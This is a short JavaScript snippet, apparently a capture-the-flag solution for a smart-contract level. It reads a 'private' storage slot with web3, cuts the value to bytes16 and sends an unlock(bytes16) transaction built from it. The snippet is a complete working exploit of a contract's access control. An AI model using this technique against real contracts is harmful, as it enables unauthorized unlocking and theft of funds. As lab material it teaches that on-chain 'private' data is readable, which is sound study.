```js
await web3.eth.getStorageAt(contract.address, 5)
// '0x8ecd31a41801d67c86318b657bb0b81d39a2c68668fda24a3432b7e618ae05dd'

key = '0x8ecd31a41801d67c86318b657bb0b81d39a2c68668fda24a3432b7e618ae05dd'.substring(2, 2 + 32)
// '8ecd31a41801d67c86318b657bb0b81d'
sighash = web3.utils.sha3('unlock(bytes16)').substring(0, 10)
rawData = `${sighash}${key.padEnd(64, '0')}`
// Another way to calculate the raw data:
rawData = web3.eth.abi.encodeFunctionCall(contract.abi[3], [`0x${key}`])

await sendTransaction({ from: player, to: contract.address, data: rawData })
```
